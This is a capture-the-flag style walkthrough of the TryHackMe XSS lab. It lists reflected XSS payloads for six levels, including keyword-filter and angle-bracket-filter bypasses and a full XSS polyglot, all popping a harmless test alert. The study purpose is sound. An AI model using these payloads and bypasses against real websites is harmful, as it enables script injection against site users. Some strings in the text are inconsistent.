# XSS
From THM XSS Labs

https://vine-sea-2c5.notion.site/Script-Page-1243b89759a6807eb5deef23b5c92518?pvs=4

# Script Page

The aim for each level will be to execute the JavaScript alert function with the string **XXXTESTXXX.**

```bash
**<script>alert('XXXTESTXXX');</script>**
```

## **Level One:**

If you view the Page Source, You'll see your name reflected in the code:

```jsx
<div class="text-center">
	<h2>hello, tester</h2>
</div>
```

Instead of entering your name, we're going to try entering the following JavaScript Payload:

`**Try entering the payload:**`

```bash
**<script>alert('XXXTESTXXX');</script>**
```

Now, when you click the enter button, you'll get an alert popup with the string **XXXTESTXXX,** and the page source will look like the following:

```jsx
<div class="text-center">
	<h2>hello, <script>alert('**XXXTESTXXX**');</script></h2>
</div>
```

Then, you'll receive a confirmation message that your payload was successful.

## **Level Two:**

Like the previous level, you're being asked again to enter your name. This time, when clicking enter, your name is reflected in an input tag instead:

Viewing the page source, you can see your name reflected inside the value attribute of the input tag:

```jsx
<div class="text-center">
	<h2>Hello, <input value="tester"></h2>
</div>
```

It wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we must escape the input tag first so the payload can run properly. You can do this with the following payload.

`**Try entering the payload:**`

```bash
**"><script>alert('XXXTESTXXX');</script>**
```

The critical part of the payload is the **`">`,** which closes the value parameter and the input tag.

This now closes the input tag properly and allows the JavaScript payload to run:

`**Try entering the payload:**`

```jsx
<div class="text-center">
	<h2>Hello, <input value=""><script>alert('XXXTESTXXX');</script>"></h2>
</div>
```

When you click the enter button, an alert popup with the string THM will appear. Then, you'll receive a confirmation message that your payload was successful.

## **Level Three:**

You're presented with another form asking for your name. As in the previous level, your name is reflected inside an HTML tag, this time, the text area tag.

We'll have to escape the text area tag a little differently from the input one (in Level Two) by using the following payload:

`**T**ry entering the payload:**`

```bash
**</textarea><script>alert('XXXTESTXXX');</script>**
```

This turns this:

```jsx
<div class="text-center">
	<h2>Hello, <textarea>tester</textarea></h2>
</div>
```

Into This:

```jsx
<div class="text-center">
	<h2>Hello, <textarea></textarea><script>alert('**XXTESTXX**');</script></textarea></h2>
</div>
```

The critical part of the above payload is **`</textarea>`**, which causes the textarea element to close so the script will run.

An alert popup with “**XXXTESTXXX**” will appear when you click the enter button. 

## **Level Four:**

Entering your name into the form will reflect it on the page. This level looks similar to level one, but upon inspecting the page source, you'll see that your name is reflected in some JavaScript code.

```jsx
<script>
	document.getElementsByClassName('name')[0].innerHTML='tester';
</script>
```

You'll have to escape the existing JavaScript command so you're able to run your code; you can do this with the following payload :

`**Try entering the payload:**`

```bash
**';alert('XXXTESTXXX');//**
```

 The screenshot below shows that you will execute your code. The **`'`** closes the field specifying the name, then**`;`** signifies the end of the current command, and the **`//`** at the end makes anything after it a comment rather than executable code.

```jsx
<script>
	document.getElementsByClassName('name')[0].innerHTML='';alert('**XXXTESTXXX');//';**
</script>
```

When you click the enter button, an alert popup with the string THM will appear. Then, you'll receive a confirmation message that your payload was successful.

## **Level Five:**

This level looks the same as level one, and your name is reflected in the same place. But if you try the **`<script>alert('`XXXTESTXXX`');</script>`** payload, it won't work. When you view the page source, you'll see why.

```jsx
<div class="text-center">
	<h2>Hello, <>alert('**XXXTESTXXX**');</></h2>
</div>
```

The word **`script`** is removed from your payload because a filter strips out any potentially dangerous words.

When a word gets removed from a string, there's a helpful trick that you can try.

**Original Payload:**

```bash
**<sscriptcript>alert('XXXTESTXXX');</sscriptcript>**
```

**Text to be removed (by the filter):**

```bash
**<sscriptcript>alert('XXXTESTXXX');</sscriptcript>**
```

**Final Payload (after passing the filter):**

```bash
**<script>alert('XXXTESTXXX');</script>**
```

 `**T**ry entering the payload:**`

```bash
 **<sscriptcript>alert('XXXTESTXXX');</sscriptcript>**
```

 When you click the enter button, an alert popup with “XXXTESTXX” will appear. Then, you'll receive a confirmation message that your payload was successful.

## **Level Six:**

Similar to level two, where we had to escape from the value attribute of an input tag, we can try:

```bash
**"><script>alert('XXXTESTXXX');</script>**
```

**But that doesn't work. Let's inspect the page source to see why that doesn't work.

```jsx
<div class="text-center">
		<h2>Your Picture</h2>
		<img src=""scriptalert('XXXTESTXXX');/script">
</div>
```

You can see that the < and > characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. The onload event executes your chosen code once the image specified in the src attribute has loaded onto the web page.

Let's change our payload to reflect this:

`**Try entering the payload:**`

```bash
**/images/cat.jpg" onload="alert('XXXTESTXXX');**
```

 Then, view the page source, and you'll see how this will work.

```jsx
<div class="text-center">
	<h2>Your Picture</h2>
	<img src="/images/cat.jpg" onload="alert('XXXTESTXXX');">
</div>
```

When you click the enter button, an alert popup with the “XXXTESTXX” string will appear.

## **Polyglots:**

An XSS polyglot is a string of text that can escape attributes and tags and bypass filters. You could have used the polyglot below on all six levels you've just completed, and it would have executed the code successfully.

`**Try entering the payload:**`

```jsx
**jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XXXTESTXXX') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XXXTESTXXX')//>\x3e**
```

---

[https://vine-sea-2c5.notion.site/Script-Page-1243b89759a6807eb5deef23b5c92518?pvs=4](https://www.notion.so/Script-Page-1243b89759a6807eb5deef23b5c92518?pvs=21)
